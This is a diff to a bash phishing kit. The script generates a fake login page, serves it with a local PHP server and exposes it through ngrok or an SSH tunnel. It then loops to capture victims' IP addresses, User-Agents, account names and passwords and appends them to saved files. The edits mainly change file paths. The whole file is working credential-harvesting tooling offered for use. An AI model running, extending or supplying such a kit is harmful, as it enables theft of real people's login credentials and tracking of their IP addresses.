@@ -173,36 +173,36 @@ pass_text="${pass_text:-${default_pass_text}}"
 read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
-echo "<!DOCTYPE html>" > sites/create/login.html
-echo "<html>" >> sites/create/login.html
-echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
+echo "<!DOCTYPE html>" > create/login.html
+echo "<html>" >> create/login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> create/login.html
 IFS=$'\n'
-printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> create/login.html
 IFS=$'\n'
-printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> create/login.html
 IFS=$'\n'
-printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+printf '<input type="text" name="username" length=64>\n' >> create/login.html
 IFS=$'\n'
-printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+printf '<br><label>%s: </label>' $pass_text >> create/login.html
 IFS=$'\n'
-printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+printf '<input type="password" name="password" length=64><br><br>\n' >> create/login.html
 IFS=$'\n'
-printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
-printf '</center>' >> sites/create/login.html
-printf '<body>\n' >> sites/create/login.html
-printf '</html>\n' >> sites/create/login.html
+printf '<input value="%s" type="submit"></form>\n' $sub_text >> create/login.html
+printf '</center>' >> create/login.html
+printf '<body>\n' >> create/login.html
+printf '</html>\n' >> create/login.html
 
 
 }
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' $server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' $server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+cat $server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"
@@ -211,14 +211,14 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentia
 
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+touch $server/saved.usernames.txt
+ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' $server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+cat $server/ip.txt >> $server/saved.ip.txt
 
 if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
@@ -290,7 +290,7 @@ fi
 ##
 printf "\n"
 rm -rf iptracker.log
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"
 
 }
 
@@ -298,7 +298,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, P
 
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd $server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
@@ -322,12 +322,12 @@ checkfound
 }
 
 startx() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e $server/ip.txt ]]; then
+rm -rf $server/ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+if [[ -e $server/usernames.txt ]]; then
+rm -rf $server/usernames.txt
 
 fi
 
@@ -341,12 +341,12 @@ serverx
 
 
 start() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
+if [[ -e $server/ip.txt ]]; then
+rm -rf $server/ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+if [[ -e $server/usernames.txt ]]; then
+rm -rf $server/usernames.txt
 
 fi
 
@@ -387,7 +387,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd $server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -412,7 +412,7 @@ fi
 #printf "\n"
 #printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
 #printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-#default_option_server="1"
+#default_option_server="2"
 #read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 #option_server="${option_server:-${default_option_server}}"
 #if [[ $option_server == 1 || $option_server == 01 ]]; then
@@ -435,16 +435,16 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials,\e[0m\
 while [ true ]; do
 
 
-if [[ -e "sites/$server/ip.txt" ]]; then
+if [[ -e "$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
-rm -rf sites/$server/ip.txt
+rm -rf $server/ip.txt
 fi
 sleep 0.5
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e "$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf sites/$server/usernames.txt
+rm -rf $server/usernames.txt
 fi
 sleep 0.5
 
